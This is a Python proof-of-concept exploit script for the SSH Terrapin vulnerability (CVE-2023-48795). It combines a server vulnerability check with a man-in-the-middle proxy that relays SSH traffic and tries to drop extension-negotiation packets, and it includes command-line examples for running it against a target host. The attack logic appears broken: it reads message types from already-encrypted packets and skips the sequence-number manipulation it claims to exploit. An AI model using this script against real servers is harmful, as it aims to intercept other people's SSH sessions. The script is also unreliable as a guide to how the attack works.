#!/usr/bin/env python3
"""
Terrapin Attack - Proof of Concept Exploit
CVE-2023-48795

This script demonstrates the Terrapin attack against SSH protocol.
Educational purposes only.

Author: Security Research
Date: 2024
"""

import sys
import socket
import struct
import threading
import argparse
import time
import logging
from typing import Tuple, Optional
from scapy.all import *

# SSH Protocol Constants
SSH_MSG_DISCONNECT = 1
SSH_MSG_IGNORE = 2
SSH_MSG_UNIMPLEMENTED = 3
SSH_MSG_DEBUG = 4
SSH_MSG_SERVICE_REQUEST = 5
SSH_MSG_SERVICE_ACCEPT = 6
SSH_MSG_KEXINIT = 20
SSH_MSG_NEWKEYS = 21
SSH_MSG_KEX_ECDH_INIT = 30
SSH_MSG_KEX_ECDH_REPLY = 31
SSH_MSG_EXT_INFO = 7

# Vulnerable cipher suites
VULNERABLE_CIPHERS = [
    b'chacha20-poly1305@openssh.com',
    b'aes128-cbc',
    b'aes192-cbc',
    b'aes256-cbc'
]

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)


class TerrapinAttack:
    """
    Main class implementing the Terrapin attack
    """
    
    def __init__(self, target_host: str, target_port: int, 
                 listen_port: int = 2222, interface: str = 'eth0'):
        """
        Initialize the Terrapin attack
        
        Args:
            target_host: Target SSH server hostname/IP
            target_port: Target SSH server port
            listen_port: Port to listen on for client connections
            interface: Network interface for packet capture
        """
        self.target_host = target_host
        self.target_port = target_port
        self.listen_port = listen_port
        self.interface = interface
        
        self.client_socket = None
        self.server_socket = None
        
        self.vulnerable = False
        self.attack_successful = False
        
        # State tracking
        self.client_newkeys_sent = False
        self.server_newkeys_sent = False
        self.ext_info_dropped = False
        
        self.client_sequence = 0
        self.server_sequence = 0
        
    def check_vulnerability(self) -> bool:
        """
        Check if target server is vulnerable
        
        Returns:
            bool: True if vulnerable, False otherwise
        """
        logger.info(f"Checking vulnerability of {self.target_host}:{self.target_port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target_host, self.target_port))
            
            # Read SSH banner
            banner = sock.recv(1024)
            logger.info(f"Server banner: {banner.decode().strip()}")
            
            # Send our banner
            client_banner = b"SSH-2.0-TerrapinScanner_1.0\r\n"
            sock.send(client_banner)
            
            # Send KEXINIT
            kexinit = self._build_kexinit_packet()
            sock.send(kexinit)
            
            # Receive server KEXINIT
            server_kexinit = self._recv_ssh_packet(sock)
            
            if server_kexinit:
                vulnerable_cipher_found = False
                ext_info_found = False
                
                # Parse KEXINIT to check for vulnerable ciphers
                if self._parse_kexinit(server_kexinit):
                    vulnerable_cipher_found = True
                    logger.info("âœ“ Server supports vulnerable cipher suites")
                
                # Check for ext-info support
                if b'ext-info-s' in server_kexinit:
                    ext_info_found = True
                    logger.info("âœ“ Server supports ext-info")
                
                self.vulnerable = vulnerable_cipher_found and ext_info_found
                
                if self.vulnerable:
                    logger.warning("ğŸ¯ Server is VULNERABLE to Terrapin attack!")
                else:
                    logger.info("Server is NOT vulnerable")
            
            sock.close()
            return self.vulnerable
            
        except Exception as e:
            logger.error(f"Error checking vulnerability: {e}")
            return False
    
    def _build_kexinit_packet(self) -> bytes:
        """
        Build SSH KEXINIT packet
        
        Returns:
            bytes: KEXINIT packet
        """
        # Cookie (16 random bytes)
        cookie = os.urandom(16)
        
        # Key exchange algorithms
        kex_algs = b'curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256'
        
        # Server host key algorithms
        host_key_algs = b'ssh-ed25519,ecdsa-sha2-nistp256,ssh-rsa'
        
        # Encryption algorithms (include vulnerable ones)
        enc_algs_c2s = b'chacha20-poly1305@openssh.com,aes128-cbc,aes256-cbc,aes128-ctr'
        enc_algs_s2c = enc_algs_c2s
        
        # MAC algorithms
        mac_algs_c2s = b'hmac-sha2-256,hmac-sha2-512,hmac-sha1'
        mac_algs_s2c = mac_algs_c2s
        
        # Compression
        comp_algs_c2s = b'none,zlib@openssh.com'
        comp_algs_s2c = comp_algs_c2s
        
        # Languages
        lang_c2s = b''
        lang_s2c = b''
        
        # Build payload
        payload = struct.pack('B', SSH_MSG_KEXINIT)
        payload += cookie
        
        # Add each algorithm list (with length prefix)
        for alg_list in [kex_algs, host_key_algs, enc_algs_c2s, enc_algs_s2c,
                        mac_algs_c2s, mac_algs_s2c, comp_algs_c2s, comp_algs_s2c,
                        lang_c2s, lang_s2c]:
            payload += struct.pack('>I', len(alg_list))
            payload += alg_list
        
        # First kex packet follows (0), reserved (0)
        payload += b'\x00\x00\x00\x00\x00'
        
        # Add padding
        padding_length = 8 - ((len(payload) + 5) % 8)
        if padding_length < 4:
            padding_length += 8
        
        padding = os.urandom(padding_length)
        
        # Build final packet
        packet_length = len(payload) + padding_length + 1
        packet = struct.pack('>I', packet_length)
        packet += struct.pack('B', padding_length)
        packet += payload
        packet += padding
        
        return packet
    
    def _recv_ssh_packet(self, sock: socket.socket) -> Optional[bytes]:
        """
        Receive SSH packet from socket
        
        Args:
            sock: Socket to receive from
            
        Returns:
            bytes: Packet data or None
        """
        try:
            # Read packet length
            length_data = sock.recv(4)
            if len(length_data) < 4:
                return None
            
            packet_length = struct.unpack('>I', length_data)[0]
            
            # Read rest of packet
            packet_data = sock.recv(packet_length)
            
            return length_data + packet_data
            
        except Exception as e:
            logger.debug(f"Error receiving packet: {e}")
            return None
    
    def _parse_kexinit(self, packet: bytes) -> bool:
        """
        Parse KEXINIT packet to check for vulnerable ciphers
        
        Args:
            packet: KEXINIT packet data
            
        Returns:
            bool: True if vulnerable cipher found
        """
        try:
            # Skip length and padding length
            offset = 6
            
            # Skip message type and cookie
            offset += 17
            
            # Parse algorithm lists
            for i in range(10):
                if offset + 4 > len(packet):
                    break
                    
                list_length = struct.unpack('>I', packet[offset:offset+4])[0]
                offset += 4
                
                if offset + list_length > len(packet):
                    break
                
                alg_list = packet[offset:offset+list_length]
                offset += list_length
                
                # Check encryption algorithms (indices 2 and 3)
                if i in [2, 3]:
                    for vuln_cipher in VULNERABLE_CIPHERS:
                        if vuln_cipher in alg_list:
                            return True
            
            return False
            
        except Exception as e:
            logger.debug(f"Error parsing KEXINIT: {e}")
            return False
    
    def start_mitm_proxy(self):
        """
        Start MITM proxy to intercept SSH traffic
        """
        logger.info(f"Starting MITM proxy on port {self.listen_port}")
        
        # Create listening socket
        listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listen_sock.bind(('0.0.0.0', self.listen_port))
        listen_sock.listen(1)
        
        logger.info(f"Waiting for client connection on port {self.listen_port}...")
        logger.info(f"Client should connect to: localhost:{self.listen_port}")
        
        try:
            self.client_socket, client_addr = listen_sock.accept()
            logger.info(f"Client connected from {client_addr}")
            
            # Connect to real server
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.connect((self.target_host, self.target_port))
            logger.info(f"Connected to target server {self.target_host}:{self.target_port}")
            
            # Start forwarding threads
            client_thread = threading.Thread(
                target=self._forward_client_to_server,
                daemon=True
            )
            server_thread = threading.Thread(
                target=self._forward_server_to_client,
                daemon=True
            )
            
            client_thread.start()
            server_thread.start()
            
            # Wait for threads
            client_thread.join()
            server_thread.join()
            
        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
        except Exception as e:
            logger.error(f"Error in MITM proxy: {e}")
        finally:
            if self.client_socket:
                self.client_socket.close()
            if self.server_socket:
                self.server_socket.close()
            listen_sock.close()
    
    def _forward_client_to_server(self):
        """
        Forward traffic from client to server with attack logic
        """
        logger.info("Starting client->server forwarding")
        
        try:
            while True:
                data = self.client_socket.recv(8192)
                if not data:
                    break
                
                # Check for SSH_MSG_NEWKEYS
                if len(data) > 5:
                    msg_type = data[5] if len(data) > 5 else 0
                    
                    if msg_type == SSH_MSG_NEWKEYS:
                        logger.warning("ğŸ”‘ Client sent SSH_MSG_NEWKEYS")
                        self.client_newkeys_sent = True
                        self.server_socket.send(data)
                        continue
                    
                    # After NEWKEYS, check for EXT_INFO
                    if self.client_newkeys_sent and not self.ext_info_dropped:
                        if msg_type == SSH_MSG_EXT_INFO:
                            logger.critical("ğŸ¯ DROPPING SSH_MSG_EXT_INFO from client!")
                            self.ext_info_dropped = True
                            self.attack_successful = True
                            # Don't forward this packet!
                            continue
                
                # Forward normally
                self.server_socket.send(data)
                
        except Exception as e:
            logger.error(f"Error in client->server forwarding: {e}")
    
    def _forward_server_to_client(self):
        """
        Forward traffic from server to client with attack logic
        """
        logger.info("Starting server->client forwarding")
        
        try:
            while True:
                data = self.server_socket.recv(8192)
                if not data:
                    break
                
                # Check for SSH_MSG_NEWKEYS
                if len(data) > 5:
                    msg_type = data[5] if len(data) > 5 else 0
                    
                    if msg_type == SSH_MSG_NEWKEYS:
                        logger.warning("ğŸ”‘ Server sent SSH_MSG_NEWKEYS")
                        self.server_newkeys_sent = True
                        self.client_socket.send(data)
                        continue
                    
                    # After NEWKEYS, check for EXT_INFO
                    if self.server_newkeys_sent and not self.ext_info_dropped:
                        if msg_type == SSH_MSG_EXT_INFO:
                            logger.critical("ğŸ¯ DROPPING SSH_MSG_EXT_INFO from server!")
                            self.ext_info_dropped = True
                            self.attack_successful = True
                            # Don't forward this packet!
                            continue
                
                # Forward normally
                self.client_socket.send(data)
                
        except Exception as e:
            logger.error(f"Error in server->client forwarding: {e}")
    
    def print_summary(self):
        """
        Print attack summary
        """
        print("\n" + "="*60)
        print("TERRAPIN ATTACK SUMMARY")
        print("="*60)
        print(f"Target: {self.target_host}:{self.target_port}")
        print(f"Vulnerable: {self.vulnerable}")
        print(f"Attack Successful: {self.attack_successful}")
        print(f"EXT_INFO Dropped: {self.ext_info_dropped}")
        print("="*60)
        
        if self.attack_successful:
            print("\nâœ… Attack successful! SSH connection established with")
            print("   degraded security (EXT_INFO removed)")
            print("\nâš ï¸  This demonstrates the Terrapin attack vulnerability.")
        else:
            print("\nâŒ Attack was not successful or conditions not met")
        
        print("\n")


def main():
    """
    Main entry point
    """
    parser = argparse.ArgumentParser(
        description='Terrapin Attack POC - CVE-2023-48795',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Check if server is vulnerable
  python3 terrapin_exploit.py --target 192.168.1.100 --check-only
  
  # Run full attack
  python3 terrapin_exploit.py --target 192.168.1.100 --port 22 --proxy-port 2222
  
  # Then connect with SSH client:
  ssh -p 2222 user@localhost
        '''
    )
    
    parser.add_argument('--target', required=True,
                       help='Target SSH server hostname or IP')
    parser.add_argument('--port', type=int, default=22,
                       help='Target SSH server port (default: 22)')
    parser.add_argument('--proxy-port', type=int, default=2222,
                       help='Local port to listen on (default: 2222)')
    parser.add_argument('--check-only', action='store_true',
                       help='Only check vulnerability, don\'t attack')
    parser.add_argument('--interface', default='eth0',
                       help='Network interface (default: eth0)')
    parser.add_argument('--verbose', action='store_true',
                       help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Print banner
    print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           TERRAPIN ATTACK - PROOF OF CONCEPT              â•‘
â•‘                   CVE-2023-48795                          â•‘
â•‘                                                            â•‘
â•‘                âš ï¸  EDUCATIONAL USE ONLY âš ï¸                 â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)
    
    # Create attack instance
    attack = TerrapinAttack(
        target_host=args.target,
        target_port=args.port,
        listen_port=args.proxy_port,
        interface=args.interface
    )
    
    # Check vulnerability
    if not attack.check_vulnerability():
        logger.error("Target is not vulnerable or unreachable")
        return 1
    
    if args.check_only:
        logger.info("Check-only mode, exiting")
        return 0
    
    # Start attack
    logger.info("Starting Terrapin attack...")
    logger.info("Connect your SSH client to complete the attack")
    
    try:
        attack.start_mitm_proxy()
    except KeyboardInterrupt:
        logger.info("Attack interrupted")
    finally:
        attack.print_summary()
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
